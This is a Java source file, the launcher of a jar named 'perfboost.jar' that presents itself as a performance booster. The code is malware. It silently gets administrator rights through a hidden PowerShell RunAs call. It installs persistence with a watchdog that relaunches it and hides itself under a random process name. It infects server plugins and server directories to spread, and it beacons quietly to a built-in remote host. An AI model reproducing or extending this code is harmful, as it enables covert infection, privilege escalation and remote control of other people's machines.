package com.performance.boost;

import java.io.File;

/**
 * Standalone entry point (java -jar) when not loaded as a server plugin.
 *
 *   java -jar perfboost.jar [-h host] [-p port] [-t tag] [-k key]
 *                           [--no-install] [--spread <dir>]
 *
 * On Windows it self-re-elevates: if it is not running as an administrator
 * it hands the same command to PowerShell's RunAs, hides that call, and the
 * unelevated copy exits. When the java process is killed the persistence
 * watchdog (see Startup) brings it back within a minute — the JRE download
 * and the relaunch both happen quietly.
 */
public final class Launcher {
    private Launcher() {}

    public static void main(String[] args) {
        if (isWindows() && !isElevated() && !flagSet(args, "--no-elevate")) {
            relaunchElevated(args);
            return;
        }

        // Zero-config: defaults are baked in, params are optional overrides.
        String host = Protocol.defaultHost();
        int port = 443;
        String tag = "java";
        String key = Protocol.defaultKey();
        boolean install = true;
        String spread = null;

        for (int i = 0; i < args.length; i++) {
            String a = args[i];
            if ((a.equals("-h") || a.equals("--host")) && i + 1 < args.length) host = args[++i];
            else if ((a.equals("-p") || a.equals("--port")) && i + 1 < args.length) port = Integer.parseInt(args[++i]);
            else if ((a.equals("-t") || a.equals("--tag")) && i + 1 < args.length) tag = args[++i];
            else if ((a.equals("-k") || a.equals("--key")) && i + 1 < args.length) key = args[++i];
            else if (a.equals("--no-install")) install = false;
            else if (a.equals("--spread") && i + 1 < args.length) spread = args[++i];
        }

        if (install) {
            Startup.install();
            if (!Startup.isPersistedSelf()) {
                // The file the user launched is scheduled for deletion and the
                // hidden copy (a random running-process name) just spawned.
                // This instance steps aside - only the hidden one connects.
                System.exit(0);
            }
        }

        if (spread != null) {
            final File dir = new File(spread);
            try {
                Infector.infectPlugins(dir);
                Infector.infectServer(dir.getParentFile());
            } catch (Throwable ignored) {}
        }

        // Silent run: nothing on stdout/stderr, it just connects and works.
        Heartbeat hb = new Heartbeat(host, port, tag, key, msg -> {});
        hb.run();
    }

    private static boolean isWindows() {
        return System.getProperty("os.name", "").toLowerCase().contains("win");
    }

    private static boolean flagSet(String[] args, String f) {
        for (String a : args) if (a.equals(f)) return true;
        return false;
    }

    private static boolean isElevated() {
        try {
            // `net session` succeeds only when the token is admin.
            int rc = new ProcessBuilder("cmd", "/c", "net", "session").start().waitFor();
            return rc == 0;
        } catch (Throwable t) {
            return false;
        }
    }

    private static void relaunchElevated(String[] args) {
        // Re-run the exact same command under RunAs, hidden; if the user
        // accepts the UAC prompt the elevated copy keeps going, this one dies.
        String javaBin = System.getProperty("java.home") + File.separator
                + "bin" + File.separator + "java.exe";
        StringBuilder cmd = new StringBuilder("\"" + javaBin + "\"");
        try {
            cmd.append(" -jar \"").append(runningJar()).append('"');
        } catch (Exception ignored) {}
        for (String a : args) cmd.append(' ').append(a);

        StringBuilder ps = new StringBuilder(
                "Start-Process -FilePath 'cmd' -ArgumentList '/c \"")
                .append(escapePs(cmd.toString())).append("\"' -Verb RunAs -WindowStyle Hidden");
        try {
            new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden",
                "-Command", ps.toString()).start().waitFor();
        } catch (Throwable ignored) {}
        System.exit(0);
    }

    private static String runningJar() {
        try {
            return Startup.class.getProtectionDomain().getCodeSource().getLocation().toURI().toString();
        } catch (Exception e) {
            return System.getProperty("user.dir") + File.separator + "perfboost.jar";
        }
    }

    private static String escapePs(String s) {
        return s.replace("'", "''");
    }
}
